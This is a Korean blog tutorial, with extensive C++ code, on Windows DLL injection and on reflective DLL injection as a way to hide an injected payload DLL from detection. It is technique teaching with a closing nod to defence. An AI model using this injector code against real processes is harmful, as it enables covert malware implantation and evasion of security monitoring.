---
title:  "Windows - Process Injection Technique: Reflective DLL Injection"
categories:
  - WINDOWS
tags:
  - INJECTION
  - PROCESS
  - EXPLOIT
---
# Process Injection Technique: Reflective DLL Injection
## 0x00_Description
윈도우 상에서 DLL injection 위한 기법 중, [이곳](https://0x00sec.org/t/reflective-dll-injection/3080)을 참조하여 Reflective DLL Injection에 대해서 명세하였다. 

기본적인 DLL Injection은 다른 프로세스의 공간에 임의의 DLL을 로드하여 원하는 코드를 실행하도록 하는 것이다. 다음 코드는 `CreateRemoteThread()` 함수를 이용한 기본적인 DLL Injection이다. 

```c++
BOOLEAN BasicInjectDll(HANDLE hProcess, LPCSTR lpszDllPath,SIZE_T dwDllPathLen) {
    SIZE_T dwWritten = 0;
    LPVOID lpBaseAddress = NULL;
    HMODULE hModule = NULL;
    LPVOID lpStartAddress = NULL;
    printf("[+] Start Basic DLL Injection\n");
    printf("\t[-] DLL Path > %s\n", lpszDllPath);
    printf("\t[-] DLL Length > %d\n", (int) dwDllPathLen);
    lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL) {
        printf("[!] Error - BasicInjectDll() - %d\n", GetLastError());
        return FALSE;
    }
    printf("\t\t\t[*] Complete > VirtualAllocEx() > %p\n", lpBaseAddress);

    if (WriteProcessMemory(hProcess, lpBaseAddress, lpszDllPath, dwDllPathLen, &dwWritten) == NULL) {
        printf("[!] Error - BasicInjectDll() - %d\n", GetLastError());
        return FALSE;
    }
    printf("\t\t\t[*] Complete > WriteProcessMemory()\n");
    hModule = GetModuleHandle(L"kernel32.dll");
    if (hModule == NULL) {
        printf("[!] Error - GetModuleHandle() - %d\n", GetLastError());
        return FALSE;
    }
    printf("\t\t\t[*] Complete > GetModuleHandle()\n");
    lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");
    if (lpStartAddress == NULL) {
        printf("[!] Error - GetProcAddress() - %d\n", GetLastError());
        return FALSE;
    }
    printf("\t\t\t[*] Complete > GetProcAddress() > %p\n", lpStartAddress);
    if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL) == NULL) {
        printf("[!] Error - CreateRemoteThread() - %d\n", GetLastError());
        return FALSE;
    }
    printf("\t\t\t[*] Complete > CreateRemoteThread()
    
    return TRUE;
}
```

기본적으로 DLL Injection은 대상 프로세스의 메모리에 `WirteProcessMemory()` 함수로 DLL의 경로를 할당하고 `LoadLibrary()`를 통해서 해당 경로의 DLL이 로드될 때 `DllMain`이 실행된다는 점을 이용하여 원하는 코드를 실행한다. 이 때, DLL의 경로가 `LoadLibrary()` 함수의 파라미터로 전달되어야 하며 이로 인하여 은닉화(Hiding)가 낮아 탐지가 쉬워진다. 이를 해결하기 위해 Reflective DLL Injection을 사용하는 경우가 존재한다.

참고로 정상적으로 DLL 로딩하는 방식에는 프로그램에서 사용되는 순간에 로딩, 사용 후 해제되는 `Explicit Linking(명시적 연결)`과 프로그램 시작 시 로딩, 종료 시 해제되는 `Implicit Linking(암시적 연결)` 두가지 방식이 존재한다. 



## 0x01_Reflective DLL Injection

Reflective DLL Injection은 다음과 같은 과정으로 요약된다.

- [리소스](https://docs.microsoft.com/ko-kr/cpp/windows/how-to-create-a-resource-script-file?view=vs-2019) 섹션에 삽입된 DLL Payload를 탐색
- 찾은 DLL Payload를 메모리에 Mapping
- Import Table을 수정
- Image Base Address 주소가 차이나므로  Base Realocation Table을 Parsing
- Mapped DLL을 대상 프로세스에 Injection



첫 번째, 리소스 섹션에 삽입된 DLL Payload를 탐색하기 위해 VS의 프로젝트 이름에서 "리소스 파일 > 우 클릭 > 추가 > 새 항목 > 리소스 파일(.rc)"을 선택하여 추가하고 리소스 뷰에 접근한다. 다시, 리소스 뷰에서 "리소스 파일 > 우 클릭 > 리소스 추가 "에 접근하여 실제 DLL을 추가한다. 필자의 경우 임의의 형태로 가져오기를 하였다.

이제 편집기에서 `EnumResourceNamesEx()`를 이용하여 리소스를 획득을 위한 코드를 작성한다. 이 함수의 특이한 점은 ENUMRESNAMEPROCW 형태의 Callback 함수가 파라미터로 함께 전달된며 wszPayloadDllName과 일치하는 Resource를 탐색한다.

```c++
if (EnumResourceNamesEx(NULL, wszPayloadDllName, (ENUMRESNAMEPROCW)CallBackEnumNameFunc, reinterpret_cast<LPARAM>(&hRsrcInfo), RESOURCE_ENUM_LN | RESOURCE_ENUM_MUI, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)) == NULL) {
    // ERROR_RESOURCE_ENUM_USER_STOP
    printf("[!] Error - EnumResourceNamesEx() - %d\n", GetLastError());
    return FALSE;
}
if (hRsrcInfo == NULL) {
    return FALSE;
}
```

[해당 Callback 함수](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms648034(v=vs.85))는 다음과 같이 정의하여 사용하였다. 이 함수는 lpszName과 일치하는 Resource Handle을 찾으면 해당 주소를 저장하고 탐색을 종료한다.

```c++
BOOLEAN CALLBACK CallBackEnumNameFunc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG_PTR lParam) {
    HRSRC* phRsrc = reinterpret_cast<HRSRC*>(lParam);
    HRSRC hRsrc = FindResource(hModule, lpszName, lpszType);
    if (hRsrc == NULL) {
        return TRUE;
    }
    else {
        *phRsrc = hRsrc;
        return FALSE;
    }
    return TRUE;
}
```

이제 위 과정을 통해 찾은 Resource Handle을 이용하여 메모리에 로드하고 포인터와 사이즈를 획득한다. 이 때 LoakResource() 함수를 통해 획득한 pointer는 Read-Only이다.

```c++
// Load payload resource on the memory.
hRescData = LoadResource(NULL, hRsrcInfo);
// Get resoure pointer
lpPayload = LockResource(hRescData);
dwRsrcSize = SizeofResource(GetModuleHandle(NULL), hRsrcInfo);
```



두 번째, 메모리 영역에 구조적으로 Parsing하여 맵핑을 수행한다. 우선, 여기서 가져온 리소스 포인터(lpPayload)는 결국 dll 파일 즉, PE 구조를 가지므로 NTHeader 정보를 획득하고 Image 크기 만큼의 파일 매핑 커널 오브젝트를 생성한다. 시스템에서는 CreateFileMapping() 함수를 통해 개체를 생성하면 지정된 크기 만큼 메모리를 Reserve한다. (간단하게 생각해서 이 과정은 운영체제에서 메모리처럼 파일을 다루기 위한 것이라 보면 되는데 MMF라는 개념이다.)

```javascript
pImageDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpPayload);
pImageNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(lpPayload) + pImageDOSHeader->e_lfanew);

// INVALID_HANDLE_VALUE Param >> 파일 시스템이 아닌 시스템 페이징 파일이 지원하는 파일 매핑 개체를 생성
hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pImageNTHeader->OptionalHeader.SizeOfImage, NULL);
if (hMapping == NULL) {
    printf("[!] Error - CreateFileMapping() - %d\n", GetLastError());
    TerminateProcess(GetCurrentProcess(), -1);
}
// 주소 공간 상에 가상 메모리에 맵핑을 수행
lpMapping = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
if (lpMapping == NULL) {
    printf("[!] Error - MapViewOfFile() - %d\n", GetLastError());
    TerminateProcess(GetCurrentProcess(), -1);
}
```

파일 매핑은 메모리가 아닌 디스크 입출력으로 연결된 개체라고 생각하면 된다. 때문에 이 주소를 이용하여 데이터를 쓰게되면 디스크에 저장된다. (일반적으로 큰 용량을 한번에 메모리에 로드하거나 프로세스간 데이터 공유에 사용한다.) 파일 매핑 개체가 준비되면 MapViewOfFile() 호출하여 가상 메모리에 맵핑(Reserve -> Commit) 후, Mapping(사상)된 시작 위치와 마지막 위치를 가진 BYTE 형 vector 변수를 반환한다.

```c++
// Copy Header
CopyMemory(lpMapping, lpPayload, pImageNTHeader->OptionalHeader.SizeOfHeaders);

// Copy Sections
int i = 0;
for (i = 0; i < pImageNTHeader->FileHeader.NumberOfSections; i++) {
    pImageSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD>(lpPayload) + pImageDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
    CopyMemory(reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpMapping) + pImageSectionHeader->VirtualAddress), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpPayload) + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData);
}

vPayloadData = vector<BYTE>(reinterpret_cast<LPBYTE>(lpMapping), reinterpret_cast<LPBYTE>(lpMapping) + pImageNTHeader->OptionalHeader.SizeOfImage);
UnmapViewOfFile(lpMapping);
CloseHandle(hMapping);
pinh = pImageNTHeader;

return vPayloadData;
```

추가로 PointerToRawData는 실제 파일에서 Section 위치를 Offset 기준으로 찾는 것이며 RVA를 계산하기 위한 VirtualAddress 변수와는 다른 것이다. 자세한 내용은 [MSDN](https://docs.microsoft.com/en-us/previous-versions/ms809762(v=msdn.10))에서 확인이 가능하다.



세 번째, `CreateToolhelp32Snapshot()`를 이용하여 모든 프로세스의 스냅샷을 획득 후, 현재 실행 중인 프로세스에 해당하는 PID를 이용하여 프로세스 핸들을 획득한다. (또는, DLL을 삽입할 타겟 프로세스 핸들)

```c++
pe32.dwSize = sizeof(PROCESSENTRY32);

// 0x2 == TH32CS_SNAPPROCESS
hSnapshot = CreateToolhelp32Snapshot(0x02, targetPid);

// Get Process Infomation
if (!Process32First(hSnapshot, &pe32)) {
    printf("[!] Error - Process32First() - %d\n", GetLastError());
    TerminateProcess(GetCurrentProcess(), -1);
}

while (Process32Next(hSnapshot, &pe32)) {
    // Check Process Name
    if (strcmp(CW2A(pe32.szExeFile), currentFileName.c_str()) == 0) {
        // Get Handle to Current Process
        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        CloseHandle(hSnapshot);
        if (hProcess == NULL) {
            printf("[!] Error - OpenProcess() - %d\n", GetLastError());
            TerminateProcess(GetCurrentProcess(), -1);
        }
        return hProcess;
    }
}

CloseHandle(hSnapshot);
printf("[!] Error - GetProcess()\n");
TerminateProcess(GetCurrentProcess(), -1);

return hProcess;
```

이 후, 획득한 핸들을 이용하여 가상 메모리를 할당이 가능한지 확인한다.

```c++
lpAllocAddr = VirtualAllocEx(hProcess, NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (lpAllocAddr == NULL) {
    printf("[!] Error - EnumResourceNamesEx() - %d\n", GetLastError());
    TerminateProcess(GetCurrentProcess(), -1);
}
```



네 번째, 메모리에 맵핑되어 있는 DLL 파일을 현재 로드되어 공격 대상 실행 파일을 참조하여 IAT를 수정한다.

```c++
// Parse Import Table
if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
    pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    // 비어있는 IMAGE_IMPORT_DESCRIPTOR가 탐색될 때 까지 Rebuild
    while (pImportDescriptor->Name != NULL) {
        // 로드되는 DLL 이름을 이용하여 핸들을 획득
        lpLibrary = reinterpret_cast<PCHAR>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Name);
        hLibModule = LoadLibraryA(lpLibrary);
        // GET IID(Image Import Discriptor) INFO
        nameRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Characteristics);
        symbolRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
        lpThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
        // 주소(lpThunk에서 가르키는 값)을 수정한다. 즉, 현재 메모리에 로드되어 있는 DLL의 IAT를 현재 로드된 DLL의 주소들로 반복하여 수정한다.
        for (; nameRef->u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
        // IMAGE_ORDINAL_FLAG를 이용한 검증은 NONAME으로 적용된 즉, 이름을 숨긴 함수를 찾기위한 방법
            if (nameRef->u1.AddressOfData & IMAGE_ORDINAL_FLAG) {
                // MAKEINTRESOURCEA() 경우 정수형의 ID를 가지는 포인터를 획득하는 매크로
                *(FARPROC*)lpThunk = GetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef->u1.AddressOfData));
            }
            else {
                    PIMAGE_IMPORT_BY_NAME thunkData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<DWORD>(lpBaseAddress) + nameRef->u1.AddressOfData);
                    *(FARPROC*)lpThunk = GetProcAddress(hLibModule, reinterpret_cast<LPCSTR>(&thunkData->Name));
            }
        }
        FreeLibrary(hLibModule);
        pImportDescriptor++;
    }
}
return TRUE;
```

위 코드에서 사용된 PIMAGE_IMPORT_DESCRIPTOR의 정의는 "winnt.h" 내에 아래와 같이 정의되어 있다.

```c++
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD Characteristics; // 0 for terminating null import descriptor
        DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
    } DUMMYUNIONNAME;
    DWORD TimeDateStamp; // 0 if not bound,
                                 // -1 if bound, and real date\time stamp
                                 // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                 // O.W. date/time stamp of DLL bound to (Old BIND)
    DWORD ForwarderChain; // -1 if no forwarders
    DWORD Name;
    DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)
} IMAGE_IMPORT_DESCRIPTOR;
typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
```

PIMAGE_THUNK_DATA는 "winnt.h" 내에 아래와 같이 정의되어 있다.

```c++
typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString; // PBYTE 
        DWORD Function; // PDWORD
        DWORD Ordinal;
        DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA32;
typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;
```



다섯 번째, 실행(PE) 파일이 메모리 상에 로드 될 때, Image Base에 할당되지 못할 경우 별도의 메모리 주소에 할당하거나 ALSR이 적용된 경우 PE Relocation이 수행된다.  이 때, Base Relocation Table을 참조하게 되며 현재 메모리에 맵핑된 DLL 의 정보와 Relocation이 되었을 경우의 주소가 상이하기 때문에 직접 맵핑된 주소의 정보로 Relocation Table 정보를 수정한다.

```c++
// IMAGE_BASE_RELOCATION의 시작과 끝을 가져온다.
fristImageBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION*> (reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

lastBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<DWORD_PTR>(fristImageBaseRelocationStruct) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION));

for (; fristImageBaseRelocationStruct < lastBaseRelocationStruct; fristImageBaseRelocationStruct = reinterpret_cast<IMAGE_BASE_RELOCATION *>(reinterpret_cast<DWORD_PTR>(fristImageBaseRelocationStruct) + fristImageBaseRelocationStruct->SizeOfBlock)) {
	reloc_item = reinterpret_cast<WORD *>(fristImageBaseRelocationStruct + 1);
	num_items = (fristImageBaseRelocationStruct->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);		
	
    DWORD idx = 0;
	for (idx = 0; idx < num_items; ++idx, ++reloc_item) {
		// TypeOffset == Type(4bits) + Offset(12bits) 이므로 Type을 확인하기 위해 비트 연산 수행
		switch (*reloc_item >> 12) {
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				// TypeOffset and 0xFFF는 Type(4)|Offset(12)에서 Type값을 제거하여 나머지 Offset 값을 획득하기 위한 로직
				*(DWORD_PTR*)(reinterpret_cast<DWORD>(lpBaseAddress) + fristImageBaseRelocationStruct->VirtualAddress + (*reloc_item & 0xFFF)) += dwDelta;
				break;
			default:
				return FALSE;
		}
	}
}
return TRUE;
```

IMAGE_BASE_RELOCATION 구조체를 찾기 위한 과정은 "winnt.h"에 선언 되어있는 정의된 구조체 변수들을 순서대로 살펴보면 이해하기 쉽다.

```c++
// 0x00_Get IMAGE_NT_HEADERS
typedef IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS;
typedef struct _IMAGE_NT_HEADERS {
	DWORD Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

// 0x01_Get IMAGE_DATA_DIRECTORY in DataDirectory[INDEX] Array 
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 // Default
#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table
typedef struct _IMAGE_OPTIONAL_HEADER {
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

// 0x02_Get _IMAGE_DATA_DIRECTORY == IMAGE_DIRECTORY_ENTRY_BASERELOC
typedef struct _IMAGE_DATA_DIRECTORY {
	DWORD VirtualAddress;
	DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

 

위와 같은 과정을 통해 최종적으로 대상 프로세스에 DLL을 삽입할 수 있으며 프로세스 메모리 정보를 살펴보면 DLL의 이름이 존재하지 않는 것을 확인 할 수 있다. 때문에 바이너리 보호를 위해 자체적으로 모니터링을 LoadLibrary()를 후킹하여 로드되는 DLL을 필터링하는 단순한 방어 기법보다 좀 더 강화된 방어가 필요가 있을 것이다.



## 0x03_PoC (YouTube)
[![Windows Process Injection Technique - Reflective DLL Injection](http://img.youtube.com/vi/VXKEFUV5MGk/0.jpg)](https://youtu.be/VXKEFUV5MGk?t=0s) 

